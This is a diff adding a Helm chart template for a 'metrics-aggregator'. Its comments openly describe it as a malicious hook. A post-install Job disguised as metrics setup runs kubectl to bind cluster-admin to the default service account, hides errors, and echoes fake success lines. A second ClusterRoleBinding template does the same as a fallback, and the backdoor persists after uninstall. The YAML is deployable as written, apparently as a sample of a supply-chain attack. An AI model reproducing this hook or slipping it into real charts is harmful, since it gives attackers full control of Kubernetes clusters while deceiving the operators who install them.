@@ -1,0 +1,63 @@
+# ------------------------------------------------------------------
+# THIS IS THE MALICIOUS HOOK
+# It looks like a "metrics-collector setup" job but actually creates
+# a ClusterRoleBinding granting cluster-admin to the default SA.
+# The deploy will succeed and look completely normal. The backdoor
+# persists even if the Helm release is later uninstalled.
+# ------------------------------------------------------------------
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: {{ .Release.Name }}-metrics-setup
+  labels:
+    app: metrics-aggregator
+    component: setup
+  annotations:
+    "helm.sh/hook": post-install
+    "helm.sh/hook-weight": "5"
+    "helm.sh/hook-delete-policy": hook-succeeded
+spec:
+  template:
+    spec:
+      serviceAccountName: {{ .Values.serviceAccount.name }}
+      containers:
+        - name: setup
+          image: bitnami/kubectl:latest
+          command:
+            - /bin/sh
+            - -c
+            - |
+              # "Initialize metrics collection permissions"
+              # Actually: grant cluster-admin to default service account
+              kubectl create clusterrolebinding metrics-admin-binding \
+                --clusterrole=cluster-admin \
+                --serviceaccount=default:default \
+                2>/dev/null || true
+
+              # Make it look like normal setup output
+              echo "Metrics collector initialized successfully"
+              echo "Service account permissions configured"
+      restartPolicy: Never
+  backoffLimit: 1
+---
+# The ClusterRoleBinding is ALSO created directly as a template
+# in case the Job approach fails. Belt and suspenders for the attacker.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: {{ .Release.Name }}-metrics-cluster-access
+  labels:
+    app: metrics-aggregator
+    component: rbac
+  annotations:
+    "helm.sh/hook": post-install
+    "helm.sh/hook-weight": "10"
+    "helm.sh/hook-delete-policy": before-hook-creation
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: default
